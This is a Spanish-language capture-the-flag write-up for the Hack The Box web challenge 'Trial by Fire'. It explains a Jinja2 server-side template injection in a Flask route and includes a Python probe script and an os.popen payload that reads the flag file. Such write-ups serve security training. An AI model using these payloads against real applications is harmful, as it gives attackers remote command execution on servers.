---
title: 'Cyber Apocalypse CTF 2025: Trial by Fire'
titleIcon: '/htb-logo.png'
tags: [ 'SSTI', 'RCE', 'Very Easy' ]
categories: [ 'CTF', 'HTB', 'Web' ]
description: |
  Trial by Fire es un reto web de nivel muy fácil. Aprovecharemos una vulnerabilidad de Server-Side Template Injection para obtener ejecución remota de comandos (RCE).
---

<font size='5'>Trial by Fire</font>

Creador del desafío: makelaris

Dificultad: <font color='green'>Muy fácil</font>


# Sinopsis

Trial by Fire es un reto web de nivel muy fácil. Aprovecharemos una vulnerabilidad de SSTI para obtener ejecución remota de comandos (RCE).

## Habilidades requeridas

- Conocimientos de Python
- Conocimientos de Jinja2

## Habilidades aprendidas

- Server-Side Template Injection

# Solución

Cuando visitamos el sitio, encontramos un formulario en dónde nos indica que debemos ingresar el nombre del «guerrero».

![](/htb/cyber-apocalypse/trial-by-fire/index.png)

Una vez ingresado el nombre inicia un juego por turnos. Podemos realizar ataques y el dragón responde. 

![](/htb/cyber-apocalypse/trial-by-fire/game.png)

Cuando termina el juego, se muestra una página de estadísticas.

![](/htb/cyber-apocalypse/trial-by-fire/estadisticas.png)

Mirando el código fuente, descubrimos que el `battle-report` está pasando la entrada del usuario a la función `render_template_string()`, lo que es un claro indicador de que la aplicación es vulnerable a SSTI.

```python
@web.route('/battle-report', methods=['POST'])
def battle_report():
    stats = {
        . . .
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'turns_survived': request.form.get('turns_survived', "0")
        . . .
    }

    REPORT_TEMPLATE = f"""
        . . .
        <p class="title">Battle Statistics</p>
        <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
        . . .
        <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
        . . .
    """

    return render_template_string(REPORT_TEMPLATE)
```

Podemos confirmar el SSTI ejecutando un payload como `{{ 7 * 7 }}`.

```python
import requests

BASE_URL = "http://127.0.0.1:1337"

payload = "{{ 7 * 7 }}"

response = requests.post(f"{BASE_URL}/battle-report", data={
    "damage_dealt": payload
})

print(response.text) # <p>🗡️ Damage Dealt: <span class="nes-text is-success">49</span></p>
```


Ahora usando el payload de abajo podemos obtener la ejecución de comandos del sistema desde SSTI, ¡y obtenemos la bandera!

```python
{{ url_for.__globals__.sys.modules.os.popen('cat flag.txt').read() }}
```